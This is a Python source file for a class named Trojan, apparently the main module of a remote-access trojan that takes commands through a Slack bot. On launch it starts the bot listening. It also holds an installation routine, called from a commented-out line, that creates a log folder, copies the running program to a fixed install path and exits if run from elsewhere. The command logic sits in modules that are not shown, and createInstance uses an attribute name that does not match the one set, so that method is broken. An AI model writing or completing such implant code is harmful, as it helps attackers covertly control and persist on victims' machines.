from os import path, mkdir
import sys, shutil
from slack_bot import slackBot
from config import Config


class Trojan:
    def __init__(self):
        self.__config = Config()
        # self.injectTrojan()
        self.slack_bot = slackBot(self.__config)
        self.slack_bot.start_listen()

    def injectTrojan(self) -> None:
        if not self.exists():
            self.createInstance()
        elif (
            self.__config.currentPath.lower()
            != str(self.__config.filePath + self.__config.fileName).lower()
        ):
            sys.exit()

    def exists(self) -> bool:
        return path.isdir(self.__config.logPath) and path.isfile(
            self.__config.filePath + self.__config.fileName
        )

    def createInstance(self) -> None:
        mkdir(self.config.logPath)
        shutil.copy(
            self.config.currentPath, self.config.filePath + self.config.fileName
        )


if __name__ == "__main__":
    trojan = Trojan()
